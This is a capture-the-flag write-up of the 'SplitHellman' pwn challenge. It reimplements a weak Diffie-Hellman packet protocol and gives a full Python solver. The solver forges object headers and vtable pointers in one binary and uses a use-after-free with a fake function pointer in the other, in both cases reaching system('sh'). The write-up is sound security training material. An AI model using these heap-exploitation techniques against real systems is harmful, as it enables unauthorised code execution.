---
title: "HyperSonic CTF 2026 SplitHellman Writeup"
description: "HyperSonic CTF 2026 SplitHellman writeup"
---

# SplitHellman

## Overview

`SplitHellman` is a pwn challenge where you have to exploit both the Alice and Bob programs. Neither program accepts plaintext commands directly; they only process encrypted packets whose keys are derived from Diffie-Hellman values.

The conditions are as follows.

- Category: `pwnable`
- Provided binaries: stripped 64-bit PIE ELF
- Goal: recover the flag fragments that Alice and Bob each hold, then combine them.

Commands such as `INFO`, `NEW`, `DISPATCH`, `DEL`, and `FLUSH` only run after the packet passes validation. So we first build a client that can send valid commands, then construct separate heap exploits for Alice and Bob.

## Challenge analysis

The terms used here:

- `server_pub`: the Diffie-Hellman public value the program prints. Alice prints it as `A`, Bob as `B`.
- `peer_pub`: the public value the attacker submits.
- `shared`: the shared value computed from `server_pub` and the private exponent the attacker picks.
- `enc_key`, `mac_key`, `obj_key`: session keys derived from `shared` and the nonce.
- `nonce`: a 64-bit value attached to each packet.
- `object`: the heap object managed by Alice.
- `note`: the user-data object managed by Bob.
- `audit object`: the audit object referenced in Bob's `FLUSH` path.

At startup both programs print the following Diffie-Hellman parameters.

```text
p = 401120980261
g = 2
```

Since `p` is small, we can recover `server_exp` from `server_pub = g^server_exp mod p` using baby-step giant-step. To build packets, we simply compute the following values from a `peer_priv` the attacker chooses.

```text
peer_pub = g^peer_priv mod p
shared   = server_pub^peer_priv mod p
```

Once a session is established, commands are sent as packets of the following form.

```text
<nonce> <len> <hex-ciphertext> <mac64-hex>
```

Encryption and MAC computation follow these relationships.

```text
ciphertext = stream_xor(enc_key, nonce, plaintext)
mac = mac64(mac_key, nonce || len)
      XOR mac64(mac_key XOR 0xfeedfacecafebabe, ciphertext)
```

Once this much is implemented, we can drive both programs' internal commands as if they were plain-text commands.

In Alice, `INFO` leaks values from which we can compute the PIE base and `obj_key`. An object has the following layout.

```text
0x00: uint64 key
0x08: uint32 type
0x0c: uint32 size
0x10: uint64 auth
0x18: uint64 encrypted_vtable
0x20: data[]
```

`auth` is computed over the object's address as well. So to forge an object header we need not only the PIE base but also the heap object's address.

```python
def alice_obj_auth(obj_key, obj_addr, key, typ, size, enc_vtable):
    material = (
        p64(key)
        + p64(typ & 0xffffffff)
        + p64(size & 0xffffffff)
        + p64(enc_vtable)
        + p64(obj_addr)
    )
    return mac64(obj_key, material)


def alice_enc_ptr(obj_key, ptr):
    return rol(ptr ^ obj_key ^ 0x0B1EC7ED0B1EC7ED, 17)
```

Because of this structure, simply overwriting the vtable pointer is not enough. We have to line up the `auth` and the encrypted vtable pointer together.

In Bob, the `note` data is allocated in a separate heap chunk. Using `DEL idx 1` frees the data heap chunk while leaving the now-closed `note` in the session table. If we then reallocate a `note` of the same size, we can fill the freed data location that the old `note` still points to with the new `note`'s contents.

The fake `audit object` used in the `FLUSH` path can be laid out as follows.

```text
0x00: audit_auth
0x08: function pointer
0x10: command string
```

The audit authentication value must match the following computation.

```python
def bob_audit_auth(obj_key, func, cmd8):
    audit_key = obj_key ^ 0x0041756469744A6F62
    return mac64(audit_key, p64(func) + p64(cmd8) + p64(0xB0BAAD1700D))
```

## Core idea

The solution splits into a packet layer and a heap-exploit layer.

First, implement the Diffie-Hellman handshake, packet encryption, and MAC to gain access to the command interface. Then obtain the PIE base and `obj_key` from the values `INFO` leaks, and, matching each program's heap layout, chain the flow all the way to a `system` call.

In Alice, we abuse the route feature to fix up an adjacent object's header. Making a `type 9` object of size `0` places its data pointer right against the next heap chunk header. Running a route copy there lets us overwrite the next object's header as well. If we get the `auth` and the encrypted vtable pointer exactly right, `DISPATCH` calls a function from the admin vtable, and that function passes the object's start address as the argument to `system`. So if we put `sh` at the object's `key` field, we get a shell.

In Bob, we exploit the fact that a closed `note` keeps holding a freed data pointer. We recreate a `note` of the same size to fill that heap chunk with a fake `audit object`, then line up the session state with `CLOSE` and `RESUME`. Then calling `FLUSH` executes the fake `audit object`'s function pointer. We put a `system` wrapper in the function pointer and a command string at offset `0x10`.

## Solution walkthrough

### Step 1. Building encrypted command packets

We start by reading the `p`, `g`, `A` or `B`, and `server_nonce` that the program prints. The attacker picks an arbitrary `peer_priv` and submits the corresponding `peer_pub`. We then compute `shared` and reimplement the key schedule verbatim to obtain `enc_key`, `mac_key`, and `obj_key`.

```text
master = derive_master(role_magic, server_pub, peer_pub,
                       shared, client_nonce, server_nonce)

enc_key, mac_key, obj_key = derive_keys(master)
```

The result of this stage is that we can send internal commands such as `INFO`. Everything in the exploit from here runs on top of this packet-building routine.

### Step 2. Collecting the leaks needed to forge Alice objects

Alice's `INFO` response contains values from which we can compute the PIE base and `obj_key`.

```python
info = c.send_cmd("INFO")
vals = qwords(info)
base = vals[0] - 0x6030
obj_key = vals[2] ^ 0xABAD1DEA
```

Since an object's `auth` incorporates the object's address, we also need a heap address. Creating a `type 3` object and then calling `DISPATCH` yields a heap object address from which we can compute later allocation addresses.

```python
c.send_cmd(f"NEW 0 4369 3 3 24 {hexarg(b'A' * 0x18)}")
leak = c.send_cmd("DISPATCH 0")
leak_obj = qwords(leak)[2]
```

From this value we compute the route-copy destination and the address of the victim object to tamper with.

### Step 3. Replacing the vtable via Alice's route copy

The primitives we use in Alice are these three.

```text
type 1: copy input data into the global route buffer
type 2: copy the route buffer into a registered destination pointer
type 9, size 0: create an object whose data pointer abuts the next heap chunk header
```

We register the `type 9` object's data pointer as the route destination, and use the route buffer to overwrite the next object's header. The payload first repairs the heap chunk header, then lays out the victim object's `key`, `type`, `size`, `auth`, and `encrypted_vtable` in order.

```text
payload =
    repaired heap chunk header
    forged object key
    forged type and size
    forged auth
    forged encrypted vtable
```

We encrypt the vtable so it points at the admin vtable. The first 8 bytes of the forged object hold the command string passed to `system`. When we then call `DISPATCH`, the vtable's first function runs and we get a shell.

### Step 4. Reusing Bob `note`'s freed data pointer

In Bob, we create a `note` with `NEW` and then call `DEL idx 1`. This path frees the data heap chunk but does not remove the `note` itself from the session table; it leaves it in a closed state.

Then, recreating a `note` of the same size makes the allocator reuse the just-freed heap chunk. The old `note` still points to that address, so from the old `note`'s perspective the new `note`'s contents become a fake `audit object`.

```text
1. Create a note with NEW
2. Free the data heap chunk with DEL idx 1
3. Reuse the freed heap chunk with a same-size NEW
4. Lay out a fake audit object in the reused heap chunk
```

At this point the fake `audit object` holds the `audit_auth`, the `system` wrapper address, and the command string.

### Step 5. Calling the function pointer in Bob's audit path

Bob's `FLUSH` only reaches the audit path when the session state is correct. So after preparing the fake `audit object`, we call `CLOSE` and `RESUME` in order.

```text
CLOSE
RESUME 305419896
FLUSH
```

We compute the base and `obj_key` from the `INFO` leak and build `audit_auth` to match the `system` wrapper address. Since Bob's offsets could vary slightly depending on the target build, the exploit selects from a set of possible offsets based on the `audit_buf` leak.

## Exploit / Solver

The final exploit has three parts.

1. The Diffie-Hellman handshake, packet encryption, and MAC implementation
2. Alice object header forgery
3. Bob fake `audit object` construction

The code below shows only the core routines. The connection handling and I/O wrappers are omitted, and `send_cmd` is assumed to be a function that sends a plaintext command as an encrypted packet.

```python
import struct


MASK = (1 << 64) - 1
P = 0x5D64AC6D25
G = 2


def u64(x):
    return x & MASK


def p64(x):
    return struct.pack("<Q", u64(x))


def rol(x, n):
    x = u64(x)
    return u64((x << n) | (x >> (64 - n)))


def splitmix_next(state):
    state = u64(state + 0x9E3779B97F4A7C15)
    z = state
    z = u64((z ^ (z >> 30)) * 0xBF58476D1CE4E5B9)
    z = u64((z ^ (z >> 27)) * 0x94D049BB133111EB)
    z = u64(z ^ (z >> 31))
    return state, z


def shash(data, seed):
    h = u64(0xCBF29CE484222325 ^ seed)
    for b in data:
        h ^= b
        h = u64(h * 0x100000001B3)
        h ^= h >> 32
    h ^= u64(len(data) * 0x9E3779B97F4A7C15)
    return splitmix_next(h)[1]


def mac64(key, data):
    a = shash(data, key ^ 0x6D61635F6B657931)
    b = shash(p64(key), 0xABCDEF0123456789)
    return rol(key ^ a ^ b, 17)


def stream_xor(enc_key, nonce, data):
    state = u64(rol(nonce, 13) ^ enc_key ^ 0x7873747265616D21)
    out = bytearray(data)
    block = b""
    for i in range(len(out)):
        if (i & 7) == 0:
            state, word = splitmix_next(state)
            block = p64(word)
        out[i] ^= block[i & 7]
    return bytes(out)


def make_packet(enc_key, mac_key, nonce, plaintext):
    if isinstance(plaintext, str):
        plaintext = plaintext.encode()
    ciphertext = stream_xor(enc_key, nonce, plaintext)
    tag = mac64(mac_key, p64(nonce) + p64(len(ciphertext)))
    tag ^= mac64(mac_key ^ 0xFEEDFACECAFEBABE, ciphertext)
    return f"{nonce} {len(ciphertext)} {ciphertext.hex()} {tag:016x}\n".encode()


def derive_master(role_magic, server_pub, peer_pub, shared,
                  client_nonce, server_nonce):
    material = b"".join(
        p64(x)
        for x in (role_magic, P, G, server_pub, peer_pub,
                  client_nonce, server_nonce)
    )
    salt = shash(material, 0x53504C495448454C)
    return shash(p64(shared) + p64(salt), 0x48454C4C4D414E31)


def derive_keys(master):
    enc = shash(p64(master) + p64(0x656E63), 0x1111111111111111)
    mac = shash(p64(master) + p64(0x6D6163), 0x2222222222222222)
    obj = shash(p64(master) + p64(0x6F626A), 0x3333333333333333)
    return enc, mac, obj


def alice_obj_auth(obj_key, obj_addr, key, typ, size, enc_vtable):
    material = (
        p64(key)
        + p64(typ & 0xffffffff)
        + p64(size & 0xffffffff)
        + p64(enc_vtable)
        + p64(obj_addr)
    )
    return mac64(obj_key, material)


def alice_enc_ptr(obj_key, ptr):
    return rol(ptr ^ obj_key ^ 0x0B1EC7ED0B1EC7ED, 17)


def bob_audit_auth(obj_key, func, cmd8):
    audit_key = obj_key ^ 0x0041756469744A6F62
    return mac64(audit_key, p64(func) + p64(cmd8) + p64(0xB0BAAD1700D))


def qwords(data):
    size = len(data) // 8
    return struct.unpack("<" + "Q" * size, data[:size * 8])


def hexarg(data):
    return "0x" + data.hex()


def exploit_alice(c, command=b"sh\x00"):
    info = c.send_cmd("INFO")
    vals = qwords(info)
    base = vals[0] - 0x6030
    obj_key = vals[2] ^ 0xABAD1DEA

    c.send_cmd(f"NEW 0 4369 3 3 24 {hexarg(b'A' * 0x18)}")
    leak = c.send_cmd("DISPATCH 0")
    leak_obj = qwords(leak)[2]

    target_a = leak_obj + 0xB0
    victim_b = target_a + 0x30
    admin_vtable = base + 0x6020
    enc_vtable = alice_enc_ptr(obj_key, admin_vtable)

    key = int.from_bytes(command[:8].ljust(8, b"\x00"), "little")
    typ = 1
    size = 0
    auth = alice_obj_auth(obj_key, victim_b, key, typ, size, enc_vtable)

    c.send_cmd(f"NEW 1 1229782938247303441 9 9 0 {hexarg(b'')}")
    c.send_cmd(f"NEW 2 {key} {typ} {typ} 0 {hexarg(b'')}")
    c.send_cmd("REGISTER 0 1")

    payload = p64(0) + p64(0x71)
    payload += p64(key) + struct.pack("<II", typ, size)
    payload += p64(auth) + p64(enc_vtable)
    payload = payload.ljust(0x40, b"\x00")

    logdata = struct.pack("<I", len(payload)) + payload
    c.send_cmd(f"NEW 3 13107 1 1 {len(logdata)} {hexarg(logdata)}")

    routedata = b"\x00" * 8 + p64(len(payload)) + p64(target_a + 0x20)
    c.send_cmd(f"NEW 4 17476 2 2 {len(routedata)} {hexarg(routedata)}")

    c.send_cmd("DISPATCH 3")
    c.send_cmd("DISPATCH 4")
    c.send_cmd("DISPATCH 2", want_reply=False)


def exploit_bob(c, command=b"sh\x00"):
    info = c.send_cmd("INFO")
    sess, stderr_ptr, audit_buf, key_xor, marker = qwords(info)[:5]

    if ((audit_buf - 0x60E0) & 0xFFF) == 0:
        base = audit_buf - 0x60E0
        system_wrapper_off = 0x1356
    elif ((audit_buf - 0x6100) & 0xFFF) == 0:
        base = audit_buf - 0x6100
        system_wrapper_off = 0x136E
    else:
        raise RuntimeError("unknown offset set")

    obj_key = key_xor ^ 0xBEEFB0B
    system_wrapper = base + system_wrapper_off
    cmd8 = int.from_bytes(command[:8].ljust(8, b"\x00"), "little")

    fake = p64(bob_audit_auth(obj_key, system_wrapper, cmd8))
    fake += p64(system_wrapper)
    fake += command[:8].ljust(8, b"\x00")
    fake += b"\x00" * 0x20

    size = 0x418
    c.send_cmd(f"NEW 0 4919 {size} {hexarg(b'A' * 0x20)}")
    c.send_cmd("DEL 0 1")
    c.send_cmd(f"NEW 1 8738 {size} {hexarg(fake)}")
    c.send_cmd("CLOSE")
    c.send_cmd("RESUME 305419896")
    c.send_cmd("FLUSH", want_reply=False)
```

For both Alice and Bob, the final call uses `sh`. From the resulting shell you just read each program's flag fragment.

## Result

The fragment obtained from Alice is as follows.

```text
HS{alice_and_bob_agreed_on_a_secret_
```

The fragment obtained from Bob is as follows.

```text
but_forgot_to_check_the_subgroup}
```

Concatenating the two fragments gives the final flag.

```text
HS{alice_and_bob_agreed_on_a_secret_but_forgot_to_check_the_subgroup}
```
